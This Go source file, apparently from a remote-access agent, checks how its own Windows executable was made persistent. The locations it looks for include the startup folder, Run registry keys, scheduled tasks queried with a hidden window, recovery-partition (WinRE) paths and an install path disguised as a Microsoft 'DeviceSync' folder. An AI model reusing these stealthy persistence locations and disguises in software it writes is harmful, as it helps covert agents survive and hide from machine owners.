//go:build windows

package agentinfo

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func detectWindowsPersistence() string {
	exePath, err := os.Executable()
	if err != nil {
		return ""
	}
	exeLower := strings.ToLower(exePath)
	appData := strings.ToLower(os.Getenv("APPDATA"))

	startupDir := filepath.Join(appData, `microsoft\windows\start menu\programs\startup`)
	if strings.Contains(exeLower, strings.ToLower(startupDir)) {
		return "startup_folder"
	}

	if strings.Contains(exeLower, `microsoft\devicesync`) {
		return "appdata"
	}

	if strings.Contains(exeLower, `goylord\agent.exe`) {
		return "legacy_appdata"
	}

	if checkRegistryPersistence() {
		return "registry"
	}

	if checkTaskScheduler(exeLower) {
		return "scheduled_task"
	}

	if strings.Contains(exeLower, `recovery`) || strings.Contains(exeLower, `winre`) {
		return "winre"
	}

	if strings.Contains(exeLower, `\temp\`) || strings.Contains(exeLower, `\tmp\`) {
		return "temp"
	}

	return "standalone"
}

func checkRegistryPersistence() bool {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()

	names, err := k.ReadValueNames(0)
	if err != nil {
		return false
	}
	for _, name := range names {
		val, _, err := k.GetStringValue(name)
		if err != nil {
			continue
		}
		lower := strings.ToLower(val)
		if strings.Contains(lower, "ovd_") || strings.Contains(lower, "goylord") || strings.Contains(lower, "devicesync") {
			return true
		}
	}
	return false
}

func checkTaskScheduler(exeLower string) bool {
	cmd := exec.Command("schtasks", "/query", "/FO", "LIST")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(string(out)), exeLower)
}
